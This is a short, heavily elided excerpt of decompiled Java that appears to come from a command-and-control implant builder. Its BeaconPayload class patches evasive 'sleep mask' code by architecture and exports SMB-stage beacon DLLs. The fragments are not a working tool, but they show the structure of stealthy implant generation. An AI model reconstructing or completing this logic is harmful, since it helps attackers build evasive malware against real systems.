...
public class BeaconPayload extends BeaconConstants {
   ...
   protected byte[] findSleepMaskCode(String var1) {
      int var2 = this.arch.equals("x64") ? 290 : 289;
      ...
      if (this.arch.equals("x64")) {
         var4[var4.length - 2] = -61;
         var4[var4.length - 1] = -52;
      } else {
   ...
   private byte[] A(String var1) {
      if (this.client == null) {
         ...
         if (var3 != null) {
            if (var3.length() > 0 && var3.length() <= 289) {
   ...
   protected byte[] patchSleepMask(byte[] var1, String var2) {
      ...
      for(var6 = var4.length; var6 < var5.length; ++var6) {
         var5[var6] = 0;
      }
   ...
   public BeaconDLL exportSMBStage() {
      ...
      var1.originalDLL = this.exportSMBDLL(var1.fileName);
      var1.peProcessedDLL = this.pe.process(var1.originalDLL, this.arch);
      return var1;
   }
   ...
   public byte[] exportSMBDLL(String var1) {
      try {
         ...
         var4 = this.patchSleepMask(var4, "tcp");
         var4 = this.patchSleepMask(var4, "smb");
